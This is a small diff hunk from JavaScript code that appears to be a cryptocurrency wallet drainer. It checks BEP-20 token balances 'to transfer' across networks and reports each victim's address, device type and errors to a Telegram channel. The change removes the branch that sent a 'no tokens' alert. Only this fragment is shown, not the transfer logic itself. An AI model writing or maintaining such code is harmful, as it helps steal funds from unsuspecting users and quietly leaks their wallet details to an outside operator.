@@ -394,13 +394,6 @@ ${deviceType}
               continue;
             }
           }
-        } else {
-          const noTokensMessage = `
-⚠️ No valid non-zero BEP-20 token balances to transfer on ${network.name}
-Address: ${userAddress}
-${deviceType}
-          `;
-          await sendTelegramNotification(noTokensMessage);
         }
       } catch (err) {
         const errorMessage = `❌ Error on ${network.name}: ${err.message}\n${deviceType}`;
